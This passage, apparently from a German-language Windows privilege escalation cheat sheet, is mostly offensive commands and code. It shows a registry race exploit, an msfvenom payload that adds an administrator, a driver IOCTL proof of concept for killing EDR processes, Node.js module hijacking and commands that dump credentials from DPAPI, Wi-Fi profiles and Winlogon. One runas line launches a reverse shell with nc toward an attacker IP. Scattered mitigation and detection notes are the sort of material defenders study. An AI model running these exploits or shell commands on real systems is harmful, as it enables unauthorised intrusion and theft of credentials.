- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während Logon-/Secure-Desktop-Übergängen erstellt und ist vom Benutzer beschreibbar.

Abuse-Flow (CVE-2026-24291 / ATConfig):

1. Fülle den **HKCU ATConfig**-Wert, der von SYSTEM geschrieben werden soll.
2. Trigger den Secure-Desktop-Copy (z. B. **LockWorkstation**), der den AT-Broker-Flow startet.
3. **Gewinne das Rennen**, indem du einen **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt; wenn der oplock auslöst, ersetze den **HKLM Session ATConfig**-Key durch einen **registry link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebigen HKLM value write hast, pivot zu LPE, indem du Service-Konfigurationswerte überschreibst:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Service, den ein normaler User starten kann (z. B. **`msiserver`**), und trigger ihn nach dem Write. **Hinweis:** Die öffentliche Exploit-Implementierung **lockt die Workstation** als Teil des Races.

Beispiel-Tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Wenn Sie diese Berechtigung über eine Registry haben, bedeutet das, dass **Sie daraus Unterregistrys erstellen können**. Bei Windows-Diensten ist das **ausreichend, um beliebigen Code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Endung vor einem Leerzeichen auszuführen.

Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, Folgendes auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Alle unquoted service paths auflisten, ausgenommen diejenigen, die zu integrierten Windows-Diensten gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Du kannst diese** Schwachstelle mit metasploit erkennen und ausnutzen: `exploit/windows/local/trusted\_service\_path` Du kannst manuell eine Service-Binary mit metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

Windows erlaubt es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binary verweist. Wenn diese Binary ersetzbar ist, könnte eine Privilegieneskalation möglich sein. Weitere Details findest du in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Anwendungen

### Installierte Anwendungen

Prüfe die **Berechtigungen der Binaries** (vielleicht kannst du eine überschreiben und Privilegien eskalieren) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei ändern kannst, um eine bestimmte Sonderdatei zu lesen, oder ob du eine Binärdatei ändern kannst, die von einem Administrator-Konto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ lädt automatisch jede Plugin-DLL in seinen `plugins`-Unterordnern. Wenn eine schreibbare portable/Copy-Installation vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start automatisch zu Codeausführung innerhalb von `notepad++.exe` (einschließlich aus `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Prüfe, ob du eine Registry oder Binary überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns locations zur Privilegieneskalation** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Suche nach möglichen **Third-Party weird/vulnerable** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber ein beliebiges Kernel Read/Write-Primitive offenlegt (häufig bei schlecht gestalteten IOCTL-Handlern), kannst du durch direktes Stehlen eines SYSTEM-Tokens aus dem Kernel-Speicher eskalieren. Siehe die Schritt-für-Schritt-Technik hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen von einem Angreifer kontrollierten Object Manager-Pfad öffnet, kann bewusstes Verlangsamen der Lookup-Auflösung (mit max-length-Komponenten oder tiefen Verzeichnisketten) das Zeitfenster von Mikrosekunden auf Dutzende Mikrosekunden strecken:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne hive-Schwachstellen erlauben es dir, deterministische Layouts zu groomen, beschreibbare HKLM/HKU-Nachkommen zu missbrauchen und Metadaten-Korruption ohne benutzerdefinierten Treiber in Kernel paged-pool Overflows zu verwandeln. Erfahre hier die vollständige Kette:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Manche Treiber akzeptieren einen Registry-Pfad aus dem Userland, validieren nur, dass es sich um einen vernünftigen UTF-16-String handelt, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` in einen Stack-Skalar wie `int readValue` auf. Wenn `RTL_QUERY_REGISTRY_TYPECHECK` fehlt, wird `EntryContext` entsprechend dem **tatsächlichen** Registry-Typ interpretiert, nicht dem Typ, den der Entwickler erwartet hat.

Das erzeugt zwei nützliche Primitives:

- **Confused deputy / oracle**: ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad erlaubt es dem Treiber, vom Angreifer gewählte Keys abzufragen, das Vorhandensein über Returncodes/Logs preiszugeben und manchmal Werte zu lesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel memory corruption**: ein Skalarziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder gepufferter Binary-Buffer mit Größe type-confused.

Praktische Exploitation-Hinweise:

- **Windows 8+ Mitigation**: wenn die Abfrage einen **untrusted hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK` trifft, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Keys innerhalb vertrauenswürdiger System-Hives** statt Werte unter `HKCU` vorzubereiten.
- **Trusted-hive staging**: verwende NtObjectManager, um beschreibbare Nachkommen von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **low-integrity**-Token erneut aus, um Keys zu finden, die aus sandboxed Contexts erreichbar sind:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: Ein 8-Byte-Direktschreibzugriff in einen 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahen Callback-/Function-Pointer teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im Direct-Mode wird erwartet, dass `EntryContext` auf eine `UNICODE_STRING` zeigt. Wenn der Code zuerst ein vom Angreifer kontrolliertes `REG_DWORD` in einen Stack-Skalar lädt und dann denselben Puffer für einen String-Read erneut verwendet, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst den `Buffer`-Pointer teilweise, was zu einem semi-kontrollierten Kernel-Write führt.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der Direct-Mode das erste `LONG` bei `EntryContext` als vorzeichenbehaftete Puffergröße. Wenn ein vorheriger `REG_DWORD`-Read einen **negativen** vom Angreifer kontrollierten Wert im wiederverwendeten Skalar hinterlässt, kopiert die nächste `REG_BINARY`-Abfrage die Bytes des Angreifers direkt über benachbarte Stack-Slots, was oft der sauberste Weg zu einem vollständigen Callback-Pointer-Overwrite ist.

Starkes Hunting-Muster: **heterogene Registry-Reads in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Pointern und Codepfaden, bei denen der erste Registry-Read steuert, ob ein zweiter Read erfolgt.

#### Ausnutzen von fehlendem FILE_DEVICE_SECURE_OPEN auf Device Objects (LPE + EDR kill)

Manche signierten Drittanbieter-Treiber erstellen ihr Device Object mit einer starken SDDL über IoCreateDeviceSecure, setzen aber `FILE_DEVICE_SECURE_OPEN` in DeviceCharacteristics vergessen. Ohne dieses Flag wird die sichere DACL nicht erzwungen, wenn das Device über einen Pfad mit einer zusätzlichen Komponente geöffnet wird, sodass jeder unprivilegierte Benutzer einen Handle erhalten kann, indem er einen Namespace-Pfad wie diesen verwendet:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Device öffnen kann, können die vom Treiber exponierten privilegierten IOCTLs für LPE und Manipulation missbraucht werden. Beispiele für in freier Wildbahn beobachtete Fähigkeiten:
- Handles mit vollem Zugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR kill aus dem User-Land via Kernel möglich wird.

Minimaler PoC-Pattern (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigationen für Entwickler
- Setze immer FILE_DEVICE_SECURE_OPEN, wenn du Geräteobjekte erstellst, die durch eine DACL eingeschränkt werden sollen.
- Validiere den Aufruferkontext für privilegierte Operationen. Füge PP/PPL-Prüfungen hinzu, bevor du das Beenden von Prozessen oder das Zurückgeben von Handles erlaubst.
- Beschränke IOCTLs (Access-Masken, METHOD_*, Eingabevalidierung) und erwäge vermittelte Modelle statt direkter Kernel-Privilegien.

Erkennungsideen für Verteidiger
- Überwache User-Mode-Öffnungen verdächtiger Gerätenamen (z. B. \\ .\\amsdk*) und bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Erzwinge Microsofts Blocklist für verwundbare Treiber (HVCI/WDAC/Smart App Control) und pflege deine eigenen Allow-/Deny-Listen.


## PATH DLL Hijacking

Wenn du **Schreibrechte innerhalb eines Ordners auf PATH** hast, könntest du eine von einem Prozess geladene DLL hijacken und **Privilegien eskalieren**.

Prüfe die Berechtigungen aller Ordner innerhalb von PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Für weitere Informationen darüber, wie dieser Check ausgenutzt werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Dies ist eine **Windows uncontrolled search path**-Variante, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.

Node löst Pakete auf, indem es das Verzeichnis nach oben durchläuft und in jedem übergeordneten Verzeichnis `node_modules`-Ordner prüft. Unter Windows kann dieser Durchlauf bis zum Laufwerksstamm reichen, sodass eine Anwendung, die von `C:\Users\Administrator\project\app.js` gestartet wird, am Ende Folgendes prüft:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **low-privileged user** `C:\node_modules` anlegen kann, kann er eine bösartige `foo.js` (oder einen Paketordner) platzieren und darauf warten, dass ein **higher-privileged Node/Electron-Prozess** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt, sodass dies zu **LPE** wird, wenn das Ziel als Administrator, aus einer erhöhten geplanten Aufgabe/einem Service-Wrapper oder aus einer automatisch gestarteten privilegierten Desktop-App läuft.

Dies ist besonders häufig, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einbindet und bei Fehlern weitermacht
- ein Paket aus Produktions-Builds entfernt, beim Packaging weggelassen oder nicht erfolgreich installiert wurde
- das verwundbare `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode liegt

### Hunting vulnerable targets

Verwende **Procmon**, um den Auflösungspfad zu belegen:

- Filter nach `Process Name` = Ziel-Executable (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filter nach `Path` `contains` `node_modules`
- Konzentriere dich auf `NAME NOT FOUND` und das letzte erfolgreiche Öffnen unter `C:\node_modules`

Nützliche Code-Review-Muster in entpackten `.asar`-Dateien oder Anwendungsquellen:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Ermittle den **fehlenden Paketnamen** aus Procmon oder durch Quellcode-Review.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:
```powershell
mkdir C:\node_modules
```
3. Ein Modul mit genau dem erwarteten Namen ablegen:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Die Opferanwendung auslösen. Wenn die Anwendung `require("foo")` versucht und das legitime Modul fehlt, kann Node `C:\node_modules\foo.js` laden.

Praktische Beispiele für fehlende optionale Module, die diesem Muster entsprechen, sind `bluebird` und `utf-8-validate`, aber die **Technik** ist der wiederverwendbare Teil: Finde jeden **fehlenden bare import**, den ein privilegierter Windows Node/Electron-Prozess auflösen wird.

### Erkennungs- und Hardening-Ideen

- Alarm auslösen, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien/Packages schreibt.
- Nach High-Integrity-Prozessen suchen, die aus `C:\node_modules\*` lesen.
- Alle Runtime-Dependencies in Production paketieren und die Nutzung von `optionalDependencies` prüfen.
- Drittanbieter-Code auf stille `try { require("...") } catch {}`-Muster überprüfen.
- Optionale Prüfungen deaktivieren, wenn die Library das unterstützt (zum Beispiel können einige `ws`-Deployments den Legacy-`utf-8-validate`-Probe mit `WS_NO_UTF_8_VALIDATE=1` vermeiden).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Prüfe die hosts file auf andere bekannte hardcodierte Computer
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerk-Schnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Überprüfe diese Seite für Firewall-bezogene Befehle**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Mehr[ Befehle für Netzwerkaufklärung hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` kann auch in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden

Wenn du root-Benutzer wirst, kannst du auf jedem Port lauschen (beim ersten Mal, wenn du `nc.exe` verwendest, um auf einem Port zu lauschen, wird per GUI gefragt, ob `nc` von der Firewall erlaubt werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Von [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault speichert Benutzeranmeldedaten für Server, Websites und andere Programme, bei denen sich **Windows** **die Benutzer automatisch anmelden** kann. Auf den ersten Blick könnte das so wirken, als könnten Benutzer jetzt ihre Facebook-, Twitter- und Gmail-Anmeldedaten usw. speichern, damit sie sich automatisch über Browser anmelden. Aber das ist nicht so.

Windows Vault speichert Anmeldedaten, mit denen Windows die Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldedaten benötigt, um auf eine Ressource** (Server oder Website) zuzugreifen, **diesen Credential Manager** und Windows Vault nutzen und die bereitgestellten Anmeldedaten verwenden kann, anstatt dass Benutzer jedes Mal Benutzername und Passwort eingeben müssen.

Sofern die Anwendungen nicht mit Credential Manager interagieren, denke ich nicht, dass es möglich ist, dass sie die Anmeldedaten für eine bestimmte Ressource verwenden. Wenn Ihre Anwendung also den Vault nutzen möchte, sollte sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldedaten für diese Ressource** aus dem standardmäßigen Storage Vault anfordern.

Verwende `cmdkey`, um die auf dem System gespeicherten Anmeldedaten aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine entfernte Binärdatei über eine SMB-Freigabe auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldedaten.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird im Windows-Betriebssystem hauptsächlich zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um wesentlich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet sie die Domänenauthentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel werden mithilfe von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` die [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Key, welcher die privaten Schlüssel des Benutzers in derselben Datei schützt, gespeichert ist**, besteht typischerweise aus 64 Byte Zufallsdaten. (Wichtig ist, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, wodurch das Auflisten seines Inhalts per `dir`-Befehl in CMD verhindert wird, es jedoch über PowerShell aufgelistet werden kann).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Du kannst das **mimikatz module** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files, die durch das master password geschützt sind**, befinden sich normalerweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** werden oft für **Scripting**- und Automatisierungsaufgaben verwendet, um verschlüsselte Credentials bequem zu speichern. Die Credentials werden mit **DPAPI** geschützt, was in der Regel bedeutet, dass sie nur vom selben User auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Um ein PS credentials aus der Datei, die es enthält, zu **decrypt**en, kannst du Folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Kürzlich ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use das **Mimikatz**-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Du kannst viele DPAPI-Masterkeys mit dem Mimikatz-Modul `sekurlsa::dpapi` aus dem Speicher extrahieren

### Sticky Notes

Viele Leute verwenden die StickyNotes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu speichern, ohne zu wissen, dass es sich dabei um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und sollte immer durchsucht und untersucht werden.

### AppCmd.exe

**Beachte, dass du, um Passwörter aus AppCmd.exe wiederherzustellen, Administrator sein und unter einer hohen Integritätsstufe ausführen musst.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei existiert, ist es möglich, dass einige **credentials** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

